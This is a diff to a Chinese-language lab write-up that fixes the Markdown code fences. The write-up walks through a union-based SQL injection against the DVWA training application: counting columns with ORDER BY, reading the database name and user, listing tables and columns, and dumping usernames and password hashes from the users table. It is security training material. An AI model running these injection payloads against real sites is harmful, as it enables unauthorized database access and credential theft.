@@ -44,12 +44,12 @@ Web 服务：Apache 2.4 + MySQL (MariaDB) + PHP 8.2
 2. 判断字段数
 
 使用 ORDER BY 猜测原查询的列数：
-··· 
+```
 text
 1' ORDER BY 1#   → 正常
 1' ORDER BY 2#   → 正常
 1' ORDER BY 3#   → 报错
-··· 
+```
 得出字段数为 2。
 
 ![字段](screenshots/sql_injection/行数.png)
@@ -57,37 +57,37 @@ text
 ![报错](screenshots/sql_injection/报错2.png)
 
 3. 获取当前数据库名和用户
-···  
+```
 text
 1' UNION SELECT database(), user()#
-··· 
+```
 返回：dvwa 和 root@localhost。
 
 ![字段](screenshots/sql_injection/database.png)
 
 4. 获取所有表名
-···
+```
 text
 1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'#
-··· 
+```
 得到表：guestbook, users。
 
 ![字段](screenshots/sql_injection/table.png)
 
 5. 获取 users 表的列名
-···    
+```
 text
 1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'#
-···
+```
 关键列：user, password。
 
 ![字段](screenshots/sql_injection/column.png)
 
 6. 导出用户名和密码
-···     
+```   
 text
 1' UNION SELECT user, password FROM users#
-···  
+```
 ![字段](screenshots/sql_injection/union.png)
 
 
